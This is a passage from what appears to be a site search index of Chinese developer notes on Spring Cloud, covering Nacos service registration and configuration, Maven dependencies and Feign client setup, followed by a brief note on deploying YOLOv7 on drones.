<p>Ribbon\u9965\u997f\u52a0\u8f7d(\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u63d0\u9ad8\u7b2c\u4e00\u6b21\u4f7f\u7528\u7684\u6548\u7387)</p> <pre><code>ribbon:\n  eager-load:\n      enabled: true # \u5f00\u542f\u9965\u997f\u52a0\u8f7d\n      clients: \n          - userservice # \u6307\u5b9a\u4f5c\u7528\u8303\u56f4\uff0c\u53ef\u4ee5\u4e3a\u591a\u4e2a\n          - orderservece \n</code></pre> </li> </ol>"},{"location":"Record%26Review/Spring%20Cloud/#nacos","title":"Nacos\u6ce8\u518c\u4e2d\u5fc3","text":"<p>Nacos\u662f\u963f\u91cc\u65d7\u4e0b\u7684\u4e00\u4e2a\u4ea7\u54c1\uff0c\u73b0\u5728\u5df2\u7ecf\u88abSpring Cloud\u6536\u5f55\u4e86\uff08\u4e5f\u53ef\u4ee5\u7b97\u662f\u7f16\u5185\u4eba\u5458\u4e86\uff09\uff0cNacos\u548cEureka\u90fd\u9075\u5faaSpring Cloud\u7684\u670d\u52a1\u6ce8\u518c\u4e2d\u5fc3\u7684\u63a5\u53e3\u89c4\u8303\uff0c\u56e0\u6b64\u5728\u4f7f\u7528\u65b9\u9762\u5927\u540c\u5c0f\u5f02\uff0c\u4eceEureka\u8f6c\u53d8\u5230Nacos\u51e0\u4e4e\u4e0d\u9700\u8981\u6539\u4ee3\u7801\uff0c\u53ea\u9700\u8981\u8be5\u914d\u7f6e\u5373\u53ef\uff0c\u4e0b\u9762\u5c31\u6f14\u793a\u4eceEureka\u8f6c\u5230Nacos\u7684\u8fc7\u7a0b\u3002</p>"},{"location":"Record%26Review/Spring%20Cloud/#nacoseureka","title":"Nacos\u66ff\u6362Eureka","text":"<ol> <li>\u4e0b\u8f7dNacos\u53d1\u884c\u7248Nacos\u5b98\u7f51</li> </ol> <p>\u4e0b\u8f7d\u5730\u5740\uff1aReleases \u00b7 alibaba/nacos (github.com)</p> <ol> <li> <p>\u5728bin\u76ee\u5f55\u4e0b\u6267\u884c\u547d\u4ee4\u884c<code>./startup.cmd -m standalone</code></p> </li> <li> <p>\u5728\u5de5\u7a0b\u4e2d\u6dfb\u52a0\u4f9d\u8d56\uff08SpringCloud\u7684\u4fdd\u7559\uff09\uff0c\u5bf9\u4e8e\u7248\u672c\u5bf9\u5e94\u8981\u6c42\u9ad8\uff0c\u53ef\u53c2\u8003\u7248\u672c\u8bf4\u660e Wiki </p> </li> </ol> <pre><code>&lt;dependencyManagement&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;\n            &lt;version&gt;2022.0.0.0-RC2&lt;/version&gt;\n            &lt;type&gt;pom&lt;/type&gt;\n            &lt;scope&gt;import&lt;/scope&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n&lt;/dependencyManagement&gt;\n</code></pre> <ol> <li>\u53bb\u6389Eureka\u4f9d\u8d56\uff0c\u66ff\u6362\u6210Nacos\u4f9d\u8d56</li> </ol> <pre><code>&lt;!-- \u8fd9\u4e2a\u662f\u653e\u5728dependencies\u4e0b\u7684\uff0c\u7248\u672c\u4f1a\u6709dependencyManagement\u4e2d\u914d\u7f6e\u7ba1\u7406 --&gt;\n&lt;dependency&gt;\n &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre> <ol> <li>nacos\u7684yml\u914d\u7f6e\u4fee\u6539</li> </ol> <pre><code>spring:\n  application:\n    name: UserService\n  cloud:\n    compatibility-verifier:\n      enabled: false\n      #\u8fd9\u4e2a\u4e0d\u8bbe\u7f6e\u4f1a\u56e0\u4e3a\u7248\u672c\u95ee\u9898\u62a5\u9519\uff0c\u5efa\u8bae\u6253\u5f00\n    nacos:\n      server-addr: localhost:8848  \n# \u6ce8\u518c\u4e2d\u5fc3\u5730\u5740\uff0c\u53ef\u4ee5\u7701\u7565\uff0c\u9ed8\u8ba4localhost:8848 \u548c\u670d\u52a1\u7aef\u7684\u9ed8\u8ba4\u503c\u4e00\u6837\uff0c\u56e0\u6b64\u8f6c\u53d8\u662f\u53ef\u4ee5\u53ea\u628aEureka\u914d\u7f6e\u5220\u9664\nserver:\n  port: 8081\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#pomxml_1","title":"\u5907\u4efd<code>pom.xml</code>\uff0c\u4ee5\u9632\u540e\u60a3\uff08\u5305\u542b\u914d\u7f6e\u670d\u52a1\uff09:","text":"<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\"&gt;\n    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;\n    &lt;parent&gt;\n        &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n        &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;\n        &lt;version&gt;3.1.1&lt;/version&gt;\n        &lt;relativePath/&gt;\n    &lt;/parent&gt;\n    &lt;groupId&gt;com.leotan&lt;/groupId&gt;\n    &lt;artifactId&gt;UserService&lt;/artifactId&gt;\n    &lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;\n    &lt;name&gt;UserService&lt;/name&gt;\n    &lt;description&gt;UserService&lt;/description&gt;\n    &lt;properties&gt;\n        &lt;java.version&gt;17&lt;/java.version&gt;\n        &lt;spring-cloud.version&gt;2022.0.3&lt;/spring-cloud.version&gt;\n    &lt;/properties&gt;\n    &lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;!-- Nacos\u914d\u7f6e\u670d\u52a1\u7684\u4f9d\u8d56 --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n            &lt;optional&gt;true&lt;/optional&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-config&lt;/artifactId&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;!--\u8fd9\u4e2a\u914d\u7f6e\u4e0d\u52a0\u7684\u5316\uff0cLoadBalanced\u6ce8\u89e3\u4e0d\u4f1a\u751f\u6548\uff0c\u4e5f\u5c31\u4e0d\u4eceNacos\u6ce8\u518c\u4e2d\u5fc3\u67e5\u670d\u52a1--&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n            &lt;artifactId&gt;spring-cloud-starter-loadbalancer&lt;/artifactId&gt;\n        &lt;/dependency&gt;    \n    &lt;/dependencies&gt;\n    &lt;dependencyManagement&gt;\n        &lt;dependencies&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-cloud-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;2022.0.0&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n            &lt;!-- SpringBoot --&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;3.1.1&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n            &lt;!-- SpringCloudAlibaba --&gt;\n            &lt;dependency&gt;\n                &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-cloud-alibaba-dependencies&lt;/artifactId&gt;\n                &lt;version&gt;2022.0.0.0-RC2&lt;/version&gt;\n                &lt;type&gt;pom&lt;/type&gt;\n                &lt;scope&gt;import&lt;/scope&gt;\n            &lt;/dependency&gt;\n        &lt;/dependencies&gt;\n    &lt;/dependencyManagement&gt;\n\n    &lt;build&gt;\n        &lt;plugins&gt;\n            &lt;plugin&gt;\n                &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;\n                &lt;artifactId&gt;spring-boot-maven-plugin&lt;/artifactId&gt;\n                &lt;configuration&gt;\n                    &lt;excludes&gt;\n                        &lt;exclude&gt;\n                            &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;\n                            &lt;artifactId&gt;lombok&lt;/artifactId&gt;\n                        &lt;/exclude&gt;\n                    &lt;/excludes&gt;\n                &lt;/configuration&gt;\n            &lt;/plugin&gt;\n        &lt;/plugins&gt;\n    &lt;/build&gt;\n&lt;/project&gt;\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#_3","title":"\u96c6\u7fa4\u548c\u547d\u540d\u7a7a\u95f4","text":"<ol> <li>\u4ec0\u4e48\u662f\u96c6\u7fa4</li> </ol> <p>\u6211\u4eec\u628a\u96c6\u7fa4\u770b\u6210\u662f\u4e00\u4e2a\u56e2\u961f\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u540c\u4e00\u4e2a\u56e2\u961f\u4e4b\u95f4\u7684\u534f\u4f5c\u6548\u679c\u6700\u4f73\u3002\u5728\u670d\u52a1\u90e8\u7f72\u4e2d\uff0c\u5f80\u5f80\u5c06\u90e8\u7f72\u5728\u540c\u4e00\u4e2a\u5730\u57df\u7684\u670d\u52a1\u5f53\u4f5c\u4e00\u4e2a\u96c6\u7fa4\u6765\u4f7f\u7528\uff0c\u5982\u679c\u96c6\u7fa4\u5185\u80fd\u591f\u63d0\u4f9b\u670d\u52a1\uff0c\u5219\u76f4\u63a5\u4f7f\u7528\u5185\u90e8\u7684\uff0c\u5426\u5219\u8c03\u7528\u5176\u4ed6\u96c6\u7fa4\u7684\u3002\u8fd9\u5c31\u662f\u96c6\u7fa4\u7684\u597d\u5904\u3002\u80fd\u591f\u51cf\u5c11\u5730\u57df\u6027\u5e26\u6765\u7684\u6027\u80fd\u635f\u5931\u3002</p> <ol> <li>\u96c6\u7fa4\u7684\u4f7f\u7528</li> </ol> <pre><code>spring:\n  application:\n    name: userservice\n  cloud:\n    compatibility-verifier:\n      enabled: false\n    nacos:\n      discovery:\n        server-addr: localhost:8848\n        cluster-name: XT # \u96c6\u7fa4\u540d\u79f0\uff0c\u4e00\u822c\u7528\u5730\u57df\u6765\u547d\u540d\n</code></pre> <ol> <li>\u4ec0\u4e48\u662f\u547d\u540d\u7a7a\u95f4</li> </ol> <p>\u7528\u4e8e\u8fdb\u884c\u79df\u6237\u7c92\u5ea6\u7684\u914d\u7f6e\u9694\u79bb\u3002\u4e0d\u540c\u7684\u547d\u540d\u7a7a\u95f4\u4e0b\uff0c\u53ef\u4ee5\u5b58\u5728\u76f8\u540c\u7684 Group \u6216 Data ID \u7684\u914d\u7f6e\u3002Namespace \u7684\u5e38\u7528\u573a\u666f\u4e4b\u4e00\u662f\u4e0d\u540c\u73af\u5883\u7684\u914d\u7f6e\u7684\u533a\u5206\u9694\u79bb\uff0c\u4f8b\u5982\u5f00\u53d1\u6d4b\u8bd5\u73af\u5883\u548c\u751f\u4ea7\u73af\u5883\u7684\u8d44\u6e90\uff08\u5982\u914d\u7f6e\u3001\u670d\u52a1\uff09\u9694\u79bb\u7b49\u3002</p> <ol> <li>\u5982\u4f55\u4f7f\u7528\u547d\u540d\u7a7a\u95f4</li> </ol> <pre><code>spring:\n  application:\n    name: userservice\n  cloud:\n    compatibility-verifier:\n      enabled: false\n    nacos:\n      discovery:\n        server-addr: localhost:8848\n        cluster-name: XT\n        namespace: fa5b9f17-29ca-4f91-af64-f0caac3ac533 # \u5728Nacos\u63a7\u5236\u53f0\u4e2d\u65b0\u5efa\u751f\u6210\u7684\u547d\u540d\u7a7a\u95f4ID\n</code></pre> <ol> <li>\u914d\u7f6eNacosRule\u4f7f\u7528\u96c6\u7fa4\u4f18\u5148\u539f\u5219(\u5177\u4f53\u53ef\u53c2\u7167Eureka)</li> </ol> <pre><code>userservice:\n  ribbon:\n    NFLoadBalancerRuleClassName: com.alibaba.nacos.ribbon.NacosRule\n</code></pre> <p>\u89c4\u5219\u8bf4\u660e\uff1a\u4f18\u5148\u4f7f\u7528\u540c\u4e00\u4e2a\u96c6\u7fa4\u5185\u7684\uff0c\u540c\u4e00\u96c6\u7fa4\u5185\u5219\u7528\u968f\u673a\u8c03\u7528\u5747\u8861\u3002</p> <ol> <li>\u5206\u7ec4</li> </ol> <pre><code>spring:\n  application:\n    name: userservice\n  cloud:\n    compatibility-verifier:\n      enabled: false\n    nacos:\n      discovery:\n        server-addr: localhost:8848\n        cluster-name: XT\n        namespace: fa5b9f17-29ca-4f91-af64-f0caac3ac533\n        group: Hello # \u7ec4\u540d\n</code></pre> <ol> <li>\u6743\u91cd\u7684\u4f7f\u7528</li> </ol> <p>\u6743\u91cd\u53ef\u4ee5\u5b8f\u89c2\u8c03\u6574\u4e0d\u540c\u673a\u5668\u7684\u8d1f\u8f7d\u5206\u914d\uff0c\u6743\u91cd\u5927\u7684\u8d1f\u8f7d\u5927\uff0c\u6743\u91cd\u5c0f\u7684\u8d1f\u8f7d\u5c0f\uff0c\u6743\u91cd\u4e3a0\u5219\u4e0d\u8d1f\u8f7d\uff08\u53ef\u4ee5\u7528\u6765\u5206\u6279\u6b21\u66f4\u65b0\uff0c\u4f46\u662f\u4f01\u4e1a\u4e2d\u6709\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\uff09</p>"},{"location":"Record%26Review/Spring%20Cloud/#nacos_1","title":"Nacos\u914d\u7f6e\u7ba1\u7406","text":"<p>nacos\u914d\u7f6e\u7ba1\u7406\u5e2e\u52a9\u6211\u4eec\u5728\u670d\u52a1\u8fd0\u884c\u65f6\uff0c\u52a8\u6001\u7684\u3001\u7edf\u4e00\u7684\u66f4\u6539\u670d\u52a1\u914d\u7f6e\u3002</p> <ol> <li>\u6dfb\u52a0\u4f9d\u8d56</li> </ol> <pre><code>&lt;!-- Nacos\u914d\u7f6e\u670d\u52a1\u7684\u4f9d\u8d56 --&gt;\n&lt;dependency&gt;\n    &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt;\n    &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre> <ol> <li>\u5728Nacos\u63a7\u5236\u53f0\u65b0\u5efa\u4e00\u4e2a\u914d\u7f6e\u670d\u52a1\uff1a</li> <li>Data ID\u7684\u547d\u540d\u89c4\u8303\u4e3a servicename-profile.fileextension\uff0c\u4f8b\u5982<code>userservice-dev.yaml</code>\uff0c\u5165\u5bab\u6ca1\u5199<code>profile</code>\uff0c\u5219\u4f5c\u7528\u4e8e\u6240\u6709<code>servicename</code>\u5339\u914d\u7684\u670d\u52a1\u3002</li> <li>\u914d\u7f6e\u683c\u5f0f\u63a8\u8350\u9009\u62e9<code>yaml</code>\uff08\u548c\u4e0a\u9762\u5bf9\u5e94\u5373\u53ef\uff09</li> <li>\u5185\u5bb9\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e5f\u53ef\u4ee5\u5728\u8fd0\u884c\u7684\u65f6\u5019\u51ac\u5929\u66f4\u6539</li> <li>\u5728\u548c<code>application.yaml</code>\u7edf\u8ba1\u76ee\u5f55\u4e0b\u65b0\u5efa\u4e00\u4e2a<code>bootstrap.yaml</code>\u6587\u4ef6</li> </ol> <pre><code>spring:\n  application:\n    name: userservice # \u670d\u52a1\u540d\u79f0\n  profiles:\n    active: dev #\u5f00\u53d1\u73af\u5883\n  cloud:\n    nacos:\n      server-addr: localhost:8848 # \u6ce8\u518c\u5730\u5740\n      config:\n        file-extension: yaml # \u6587\u4ef6\u540e\u7f00\n</code></pre> <ol> <li> <p>\u5230\u8fd9\u91cc\u5c31\u4f1a\u4ea7\u751f\u6700\u591a\u4e09\u4e2a\u914d\u7f6e\u6587\u4ef6\u4f5c\u7528\u4e0e\u540c\u4e00\u4e2a\u670d\u52a1\uff08bootstrap.yaml\u53ea\u5728\u670d\u52a1\u542f\u52a8\u65f6\u5f15\u5bfc\u670d\u52a1\uff0c\u4f5c\u7528\u8303\u56f4\u5f88\u5c0f\uff09</p> </li> <li> <p>servicename-profile.yaml(Nacos)</p> </li> <li>servicename.yaml(Nacos)</li> <li>application.yaml(Local)</li> </ol> <p>\u4f18\u5148\u7ea7\u4ece\u4e0a\u5230\u4e0b\u3002\u4f5c\u7528\u5728Nacos\u7aef\u7684\u914d\u7f6e\u6587\u4ef6\u53ef\u4ee5\u5b9e\u73b0\u70ed\u66f4\u65b0</p>"},{"location":"Record%26Review/Spring%20Cloud/#feignresttemplate","title":"Feign\u4ee3\u66ffRestTemplate","text":"<p>\u5728\u4e0a\u9762\u7684\u6848\u4f8b\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u5230\u5728RPC\u65f6\uff0c\u6211\u4eec\u4f1a\u5c06\u8bf7\u6c42\u786c\u7f16\u7801\u8fdb\u5165\u53e6\u4e00\u4e2a\u670d\u52a1\u7684\u4ee3\u7801\u4e2d\uff0c\u5e76\u4e14\u8fd8\u9700\u8981\u81ea\u884c\u5728\u540e\u9762\u6dfb\u52a0\u53c2\u6570\uff0c\u5982\u679c\u53c2\u6570\u8f83\u591a\u65f6\uff0c\u6216\u8005\u8fdc\u7a0b\u670d\u52a1\u8f83\u591a\u65f6\uff0c\u6211\u4eec\u7684\u4f7f\u7528\u6210\u672c\u5c31\u4f1a\u8ddf\u7740\u4e00\u8d77\u4e0a\u5347\uff0c\u5e76\u4e14\u5728\u5c06\u6765\uff0c\u5982\u679c\u6211\u4eec\u9700\u8981\u5bf9\u670d\u52a1\u8fdb\u884c\u62c6\u5206\u65f6\uff0c\u6211\u4eec\u9700\u8981\u624b\u52a8\u7684\u4fee\u6539\u4ee3\u7801\u3002\u56e0\u6b64\u6211\u4eec\u9700\u8981\u4e00\u79cd\u66f4\u52a0\u4f18\u96c5\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0RPC\uff0c\u5c3d\u91cf\u8ba9\u6d88\u8d39\u8005\u65e0\u611f\u5730\u8fdc\u7a0b\u8c03\u7528\u3002</p> <p>Feign\u662f\u58f0\u660e\u5f0fWeb Service\u5ba2\u6237\u7aef\uff0c\u5b83\u8ba9\u5fae\u670d\u52a1\u4e4b\u95f4\u7684\u8c03\u7528\u53d8\u5f97\u66f4\u7b80\u5355\uff0c\u7c7b\u4f3ccontroller\u8c03\u7528service\u3002SpringCloud\u96c6\u6210\u4e86Ribbon\u548cEureka\uff0c\u53ef\u4ee5\u4f7f\u7528Feigin\u63d0\u4f9b\u8d1f\u8f7d\u5747\u8861\u7684http\u5ba2\u6237\u7aef</p>"},{"location":"Record%26Review/Spring%20Cloud/#feignresttemplate_1","title":"Feign\u66ff\u6362RestTemplate","text":"<ol> <li>\u5f15\u5165\u4f9d\u8d56</li> </ol> <pre><code>&lt;!-- Feign --&gt;\n&lt;dependency&gt;\n &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\n &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;\n &lt;version&gt;2.2.7.RELEASE&lt;/version&gt;\n&lt;/dependency&gt;\n</code></pre> <ol> <li>\u914d\u7f6e</li> </ol> <p>\u914d\u7f6e\u7c7b\u4e0a\u52a0\u4e0a\u6ce8\u89e3<code>@EnableFeignClients</code></p> <ol> <li>\u65b0\u5efa\u4e00\u4e2aClient\u63a5\u53e3\uff0c\u63a5\u53e3\u5bf9\u5e94\u8981\u8c03\u7528\u7684\u670d\u52a1\uff0c\u4f7f\u7528SpringMVC\u7684\u6ce8\u89e3\u6807\u8bb0\u4e0a\u8bf7\u6c42\u8def\u5f84\uff0c\u5e76\u4e14\u4e3a\u4e4b\u52a0\u4e0a\u6ce8\u89e3<code>@FeignClient(service-name)</code></li> </ol> <pre><code>@FeignClient(\"UserService\") //\u5bf9\u5e94Nacos\u4e2d\u7684\u670d\u52a1\u540d\u79f0\npublic interface UserClient {\n    @GetMapping(\"/user/b/{id}\")\n    User getById(@PathVariable String id);\n\n    @GetMapping(\"/user/a/{id}\")\n    User getUserById(@PathVariable String id);\n\n}\n</code></pre> <p><code>@RequestMapping</code>\u6ce8\u89e3\u4e0d\u80fd\u6dfb\u52a0\u5230\u63a5\u53e3\u4e0a\uff0c\u56e0\u6b64\u5982\u679c\u9700\u8981\u4f7f\u7528\u65b9\u6cd5\u4e0a\u7684\u53c2\u6570\u8868\u793a\u5b8c\u6574\u7684\u8bf7\u6c42\u8def\u5f84</p>"},{"location":"Record%26Review/Spring%20Cloud/#feign","title":"Feign\u65e5\u5fd7\u914d\u7f6e","text":"<ol> <li>\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u914d\u7f6e</li> </ol> <p>\u5728<code>application.yaml</code>\u5199\u4e0b\u5982\u4e0b\u4ee3\u7801</p> <pre><code>spring:\n  application:\n    openfeign:\n      client:\n        config:\n          default:  # default\u4e3a\u5168\u5c40\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u670d\u52a1\u540d\u914d\u7f6e\n            logger-level: FULL  # \u65e5\u5fd7\u7b49\u7ea7\uff0c\u5305\u62ecNONE/BASIC/HEADER/FULL\uff0c\u7ea7\u522b\u4f9d\u6b21\u9012\u589e\uff0c\u6027\u80fd\u4f9d\u6b21\u4e0b\u964d\n</code></pre> <ol> <li> <p>\u901a\u8fc7\u4ee3\u7801\u914d\u7f6e</p> </li> <li> <p>\u65b0\u5efa\u4e00\u4e2a\u914d\u7f6e\u7c7b\uff08UserFeignConfig\uff09</p> </li> </ol> <pre><code>package com.leotan.userservice.config;\n\nimport feign.Logger;\nimport org.springframework.context.annotation.Bean;\n\npublic class UserFeignConfig {\n    @Bean\n    public Logger.Level feignLogLevel(){\n        return Logger.Level.FULL;\n    }\n}\n</code></pre> <ol> <li> <p>\u8f7d\u5165\u670d\u52a1\u914d\u7f6e</p> <ul> <li> <p>\u5355\u72ec\u670d\u52a1\u914d\u7f6e</p> <p>\u5728FeignClient\u7684\u6ce8\u89e3\u540e\u9762\u52a0\u4e0a\u8be5\u914d\u7f6e\u7c7b</p> <pre><code>@FeignClient(value = \"UserService\",configuration = UserFeignConfig.class)\n</code></pre> </li> <li> <p>\u5168\u5c40\u914d\u7f6e</p> <p>\u5728\u542f\u52a8\u7c7b\u4e0a\u539f\u6709\u7684\u6ce8\u89e3\u4e0a\u6dfb\u52a0\u53c2\u6570</p> <pre><code>@EnableFeignClients(defaultConfiguration = UserFeignConfig.class)\n</code></pre> </li> </ul> </li> </ol>"},{"location":"Record%26Review/Spring%20Cloud/#feign_1","title":"Feign\u7684\u8fde\u63a5\u4f18\u5316","text":"<p>Feign\u7684\u5e95\u5c42Http\u5ba2\u6237\u7aef\u5305\u62ecURLConnection\u3001OKHttp\u3001Apache HttpClient\uff0c\u8fd9\u4e9b</p> Http\u5ba2\u6237\u7aef \u7279\u6027 URLConnection\uff08\u4e0d\u63a8\u8350\uff09 \u9ed8\u8ba4\u5b9e\u73b0\uff0c\u4e0d\u652f\u6301\u8fde\u63a5\u6c60\uff0c\u6027\u80fd\u8f83\u5dee OKHttp \u652f\u6301\u8fde\u63a5\u6c60 Apache HttpClient \u652f\u6301\u8fde\u63a5\u6c60 <p>\u5ba2\u6237\u7aef\u914d\u7f6e\uff08\u6027\u80fd\u8c03\u4f18\uff09</p> <p>\u8fd9\u91cc\u6211\u4eec\u5c31\u4f7f\u7528ApacheHttpClient\u6700\u4e3a\u914d\u7f6e</p> <ol> <li>\u5f15\u5165\u4f9d\u8d56</li> </ol> <pre><code>&lt;dependency&gt;\n    &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt;\n    &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt;\n&lt;/dependency&gt;\n</code></pre> <ol> <li><code>application.yaml</code>\u914d\u7f6e</li> </ol> <pre><code>spring:\n  application: # \u8fd9\u91cc\u5427\u5176\u4ed6\u7684\u914d\u7f6e\u7701\u7565\u4e86\uff0c\u6bd4\u5982\u65e5\u5fd7\u7ea7\u522b\u7684\u914d\u7f6e\n    openfeign:      \n      httpclient:\n        enabled: true\n        max-connections: 200\n        max-connections-per-route: 50\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#feign_2","title":"Feign\u4f01\u4e1a\u7ea7\u6700\u4f73\u5b9e\u8df5","text":"<p>\u5c06Client\u548cPoJo\u4f5c\u4e3a\u516c\u5171\u90e8\u5206\u62bd\u53d6\u51fa\u653e\u5230\u4e00\u4e2a\u6a21\u5757\u91cc\uff0c\u5176\u4ed6\u6a21\u5757\u53ef\u4ee5\u901a\u8fc7<code>pom.xml</code>\u5bfc\u5165\u4f7f\u7528\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u6ce8\u610f\u5305\u626b\u63cf\u95ee\u9898\uff0c\u4e0d\u7136Client\u65e0\u6cd5\u914dFeign\u5b9e\u4f8b\u5316\u3002</p> <p>\u5728\u542f\u52a8\u7c7b\u4e0a\u7684</p> <pre><code>//basePackageClasses\u53c2\u6570\u53ef\u4ee5\u4e00\u4e2a\u4e00\u4e2a\u7c7b\u7684\u626b\u63cf\uff0cbasePackages\u53ef\u4ee5\u4e00\u4e2a\u5305\u4e00\u4e2a\u5305\u7684\u626b\u63cf             \n@EnableFeignClients(basePackageClasses = {User.class})\n</code></pre>"},{"location":"Record%26Review/Spring%20Cloud/#gateway","title":"GateWay","text":""},{"location":"Record%26Review/Spring%20Cloud/#_4","title":"\u6846\u67b6\u5f15\u5165","text":""},{"location":"Record%26Review/Spring%20Cloud/#_5","title":"\u57fa\u672c\u914d\u7f6e\u4f7f\u7528","text":"<p>\u656c\u8bf7\u671f\u5f85</p>"},{"location":"Record%26Review/YOLOv7%E6%A8%A1%E5%9E%8B%E9%83%A8%E7%BD%B2/","title":"\u8bbe\u8ba1\u91cd\u70b9\u96be\u70b9","text":""},{"location":"Record%26Review/YOLOv7%E6%A8%A1%E5%9E%8B%E9%83%A8%E7%BD%B2/#_2","title":"\u4f18\u5316\u6a21\u578b\u6548\u7387","text":"<p>\u5728\u7cfb\u7edf\u67b6\u6784\u8bbe\u8ba1\u4e2d\uff0c\u6211\u4eec\u4e3a\u4e86\u8fbe\u5230\u9ad8\u6548\u7387\u8bc6\u522b\u68c0\u6d4b\uff0c\u91c7\u7528\u4e86\u8fb9\u7f18\u8ba1\u7b97\u7684\u65b9\u5f0f\uff0c\u5c06YOLOv7\u8bc6\u522b\u6a21\u578b\u90e8\u7f72\u4e8e\u65e0\u4eba\u673a\u4e0a\uff0c\u7531\u4e8e\u786c\u4ef6\u56e0\u7d20\u7684\u9650\u5236\uff0c\u6211\u4eec\u96be\u4ee5\u63d0\u9ad8\u65e0\u4eba\u673a\u7684\u65e0\u4eba\u673a\u7684\u5b9e\u9645\u7b97\u529b\uff0c\u56e0\u6b64\u6211\u4eec\u91c7\u7528\u62bd\u53d6\u5173\u952e\u5e27\u7684\u65b9\u5f0f\uff0c\u5c06\u5b9e\u65f6\u62cd\u6444\u7684\u753b\u9762\u4e0e\u4e0a\u4e00\u5173\u952e\u5e27\u5bf9\u6bd4\uff0c\u68c0\u6d4b\u662f\u5426\u4e3a\u5173\u952e\u5e27\u3002\u518d\u5c06\u5173\u952e\u5e27\u8fdb\u884c\u7f3a\u9677\u68c0\u6d4b\u3002\u901a\u8fc7\u8fd9\u79cd\u51cf\u5c11\u8bc6\u522b\u6b21\u6570\u7684\u65b9\u5f0f\uff0c\u6211\u4eec\u4e0d\u4ec5\u63d0\u9ad8\u4e86\u8bc6\u522b\u6548\u7387\uff0c\u540c\u65f6\u4e5f\u51cf\u8f7b\u4e86\u786c\u4ef6\u4e0a\u7684\u9ad8\u80fd\u8017\uff0c\u9ad8\u53d1\u70ed\u7684\u95ee\u9898\u3002</p> 